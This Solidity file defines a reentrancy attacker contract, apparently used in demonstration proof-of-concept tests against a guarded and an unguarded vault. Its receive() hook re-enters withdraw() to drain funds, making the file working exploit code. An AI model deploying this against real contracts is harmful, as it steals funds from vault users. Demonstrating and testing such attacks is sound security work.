// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IVault {
    function deposit() external payable;
    function withdraw() external;
}

/// @title Attacker — reentrancy attacker used by both demo PoCs.
/// The receive() hook re-enters withdraw() while the vault still owes the
/// stake. On the guarded vault the re-entrant call is caught so the whole
/// attack completes with zero profit (the specific block is asserted by the
/// refutation test rather than hidden behind a revert).
contract Attacker {
    IVault public immutable vault;
    uint256 public stake;

    constructor(IVault vault_) payable {
        vault = vault_;
        stake = msg.value;
    }

    function attack() external {
        vault.deposit{value: stake}();
        vault.withdraw();
    }

    receive() external payable {
        if (address(vault).balance >= stake) {
            try vault.withdraw() {
                // re-entry succeeded: unguarded vault keeps paying out
            } catch {
                // blocked (guarded vault): profit stays limited to the stake
            }
        }
    }

    function profit() external view returns (uint256) {
        return address(this).balance - stake;
    }
}
